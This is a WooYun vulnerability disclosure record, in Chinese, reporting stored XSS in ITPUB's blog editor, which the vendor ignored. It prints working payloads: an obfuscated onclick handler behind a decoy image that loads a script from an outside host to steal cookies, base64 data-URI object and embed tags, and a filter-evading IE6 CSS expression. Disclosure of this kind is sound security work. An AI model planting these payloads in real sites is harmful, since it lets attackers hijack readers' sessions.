{"id": 59595, "wybug_id": "wooyun-2013-046774", "wybug_title": "ITPUB博客存储型XSS漏洞", "wybug_corp": "ITPUB", "wybug_author": "mramydnei", "wybug_date": "2013-12-23 12:12", "wybug_open_date": "2013-12-28 12:13", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 对富文本过滤不严谨 详细说明：  对发布博客功能再一次做了一下测试。发现了一些漏网之鱼。虽然对多数的on*事件进行了过滤，但是你们似乎把onclick给漏掉了。虽然需要用户交互，但是可以使用一些欺骗手段。比如像这样：\n<center><a onclick=\"document.head.appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src=String.fromCharCode(47,47,112,108,101,98,115,46,109,101,47,48,46,106,115)\"><img src=http://1.bp.blogspot.com/-rh2BSnaAULI/UP9KZhNnpEI/AAAAAAAABjY/LpLTS046xLs/s1600/Lewis-9465.jpg width=10% heigth=10%></a><BR>点击图片观看大图</center>\n当用户试图通过点击图片来查看大图时，cookie已经被偷走了。还有3个比较鸡肋的，可以做选择性过滤。其中一个为上次提到过的问题。鸡肋一：\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+\"></object>\n这段代码，虽然在Chrome和Firefox下都有效，但是Chrome会在独立域下执行故不影响用户安全。但如果用户使用Firefox打开了攻击者的博客，那cookie就会被偷走。鸡肋二：\n<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+\">\n虽然只能在Chrome下执行且在独立域下执行。但如果结合浏览器溢出漏洞（虽然比较耗时，一般会在1分左右才能成功），可能会影响用户数据安全鸡肋三：\n<div style=\"x:ｅｘｐｒｅｓｓｉｏｎ(alert(10))\">IE6</div>\n虽然只有在IE6下才可以顺利执行，但是优点是无须用户交互。根据百度流量研究院2013年的统计，国内还有19.75%的用户在使用IE6.看着情况修复吧。我反正不用IE   漏洞证明：  \n\n   修复方案：  对上述的四种方法进行针对性过滤   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-28 12:13 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}